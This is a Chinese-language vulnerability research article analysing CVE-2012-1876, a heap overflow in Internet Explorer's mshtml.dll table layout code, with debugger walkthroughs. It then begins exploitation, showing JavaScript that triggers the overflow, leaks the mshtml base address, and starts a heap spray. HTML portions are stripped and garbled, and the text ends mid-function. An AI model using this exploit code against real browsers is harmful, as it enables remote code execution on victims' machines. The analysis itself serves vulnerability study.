# Internet Explorer漏洞分析系列（一）——CVE-2012-1876
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
    1.本文一共3960个字 30张图 预计阅读时间12分钟
    2.本文作者erfze 属于Gcow安全团队复眼小组 未经过许可禁止转载
    3.本篇文章从CVE-2012-1876漏洞的分析入手 详细的阐述漏洞的成因以及如何去利用该漏洞
    4.本篇文章十分适合漏洞安全研究人员进行交流学习
    5.若文章中存在说得不清楚或者错误的地方 欢迎师傅到公众号后台留言中指出 感激不尽
## 0x01 漏洞信息
###  0x01.1 漏洞简述
  * 编号：CVE-2012-1876
  * 类型：堆溢出(Heap Overflow)
  * 漏洞影响：远程代码执行(RCE)
  * CVSS 2.0：9.3
mshtml.dll中`CTableLayout::CalculateMinMax`函数在循环向缓冲区(堆分配内存)写入数据时，未校验控制循环次数的``标签`span`属性值，故可通过精心构造`span`属性值造成堆溢出，进而实现RCE。
###  0x01.2 漏洞影响
Microsoft Internet Explorer 6—9，10 Consumer Preview
###  0x01.3 修复方案
  * [MS12-037]
## 0x02 漏洞分析
###  0x02.1 分析环境
  * OS版本：Windows XP Service Pack 3
  * Internet Explorer版本：8.0.6001.18702
  * mshtml.dll版本：8.0.6001.18702
###  0x02.2 详细分析
使用`gflags.exe`为`iexplore.exe`开启页堆：
WinDbg打开`iexplore.exe`后，通过`.childdbg 1`命令启用子进程调试。运行并打开`poc.html`：
            &nbsp 
             tag specifies column properties for each column within a  element-->
             element -->
             element should span -->
允许活动内容运行：
崩溃点如下：
WinDbg重新打开`iexplore.exe`，运行。当子进程创建完成时，`sxe ld mshtml.dll`设置`mshtml.dll`模块加载异常：
模块已加载，可拍摄快照，方便后续分析：
IDA定位到函数`CTableColCalc::AdjustForCol`引发crash处：
向上回溯查看`esi`于何处赋值(调用该函数仅`CTableLayout::CalculateMinMax+F55F`一处，故可直接在IDA中定位)：
由上图可以看出其值为`[ebx+9Ch]`，该地址处值由何而来需结合WinDbg动态调试以确定。恢复快照至已加载mshtml.dll，`bp
6368CD39`设断于`call CTableColCalc::AdjustForCol`处，成功断下后，查看堆块信息：
再次恢复快照，`bp 6367d7da`于`CTableLayout::CalculateMinMax`起始位置设断，断下后`bp
635D28F6`于`call CImplAry::EnsureSizeWorker`处设断，跟进分析：
可以看出其分配大小确为0x70，之后跟进`mshtml!_HeapRealloc`查看其分配地址：
向上回溯，`edi`指向`ebx+90h`：
如此一来，`HeapAlloc`函数返回值——即分配堆块地址写入`[ebx+9Ch]`。至此，crash处`edi`由何而来已分析完成。而写入数据为`width*100`(具体计算过程见`CWidthUnitValue::GetPixelWidth`函数)：
crash处`ecx`值为`(width*100)`标签的`CTableLayout`对象：
而`[ebx+54h]`存储所有``标签的``属性值之和(可记为`span_sum`)：
执行到`0x6367D8EF`处，从`ebx+94h`位置取出值，右移2位，与`span_sum`进行比较：
如上图所示，再经过两次比较，都满足条件才会`call
CImplAry::EnsureSizeWorker`。若`span_sum`小于4，则直接分配`0x70`大小堆块；不小于4，则分配`0x1C*span_sum`大小堆块：
分配结束后，会向`ebx+98h`位置写入`span_sum`：
向`ebx+94h`位置写入`span_sum
                var leak_index = -1;
                var dap = "EEEE";
                while ( dap.length 
            &nbsp 
            &nbsp 
            ...
            &nbsp 
                var obj_col = document.getElementById("132");
                obj_col.span = 19;
                function over_trigger() 
                {
                    var leak_addr = -1;
                    for ( var i = 0; i  (0x100-6)/2 ) 
                        { // overflowed
                            leak_index = i;
                            var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);
                            leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );
                            mshtmlbase = leak_addr - Number(0x001582b8);
                            alert(mshtmlbase);
                            break;
                        }
                    }
                    if ( leak_addr == -1 || leak_index == -1 ) 
                    { 
                            alert("memory leak failed...."); 
                    }
                    //return mshtmlbase;
                }
                // A very special heap spray
                function heap_spray()
                {
                       CollectGarbage();